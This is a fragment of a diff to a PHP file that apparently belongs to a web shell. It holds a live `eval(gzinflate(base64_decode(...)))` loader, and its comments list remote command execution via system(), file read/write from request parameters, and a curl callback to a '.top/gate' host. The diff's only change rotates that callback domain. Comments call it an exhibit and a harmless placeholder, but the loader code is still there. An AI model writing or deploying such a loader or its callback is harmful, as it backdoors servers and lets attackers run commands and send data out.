@@ -8,6 +8,6 @@ $y=gzinflate(base64_decode($_x));
 // dormant-capability markers (commented for exhibit; do not execute)
 // - cmd: $_POST['c'] -> system()
 // - file: $_GET['a'] -> read/write
-// - callback: curl POST to lanhd6549tdhse.top/gate
+// - callback: curl POST to vagqea4wrlkdg.top/gate
 eval($y);  // placeholder eval — $y resolves to `echo "BL-STAGE";` only
 ?>
